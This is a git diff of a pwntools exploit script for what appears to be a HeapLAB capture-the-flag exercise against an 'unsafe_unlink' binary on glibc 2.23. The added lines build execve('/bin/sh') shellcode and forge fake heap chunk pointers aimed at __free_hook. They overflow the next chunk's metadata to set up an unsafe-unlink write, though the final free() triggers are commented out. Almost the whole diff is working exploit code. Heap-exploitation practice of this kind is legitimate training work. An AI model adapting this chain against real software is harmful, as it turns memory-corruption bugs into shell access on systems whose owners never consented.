@@ -5,9 +5,7 @@ elf = context.binary = ELF("unsafe_unlink")
 libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again
 
 gs = '''
-set solib-search-path /home/huhu/CTF-writeups/pwn/heaplab/HeapLAB/.glibc/glibc_2.23_unsafe-unlink/
 continue
-
 '''
 def start():
     if args.GDB:
@@ -55,10 +53,34 @@ io.timeout = 0.1
 
 # =============================================================================
 
-hehe = malloc(0x88)
-huhu = malloc(0x88)
-edit(hehe, p64(0xdeadbeef) + p64(0xdeadbeef) + (96+16) * p8(0x0) + p64(0x90) + p64(0x90))
-free(1)
+# Prepare execve("/bin/sh") shellcode with a jmp over where the fd will be written.
+shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))
+shellcode_address = heap + 0x20
+
+# Request 2 small chunks.
+overflow = malloc(0x88)
+victim = malloc(0x88)
+
+# Prepare fake chunk metadata.
+# Set the fd such that the bk of the "chunk" it points to is the free hook.
+fd = libc.sym.__free_hook - 0x18
+
+# Set the bk such that the fd of the "chunk" it points to is the shellcode.
+bk = shellcode_address
+
+# Set the prev_size field of the next chunk to the actual previous chunk size.
+prev_size = 0x90
+
+# Write the fake chunk metadata to the "overflow" chunk, store the shellcode there too.
+# Overflow into the succeeding chunk's size field to clear the prev_inuse flag.
+edit(overflow, p64(fd) + p64(bk) + shellcode + b"X"*(0x70 - (len(shellcode))) + p64(prev_size) + p64(0x90))
+
+# Free the "victim" chunk to trigger backward consolidation with the "overflow" chunk.
+#free(victim)
+
+# Free the "overflow" chunk to trigger system("/bin/sh").
+#free(overflow)
+
 # =============================================================================
 
 io.interactive()
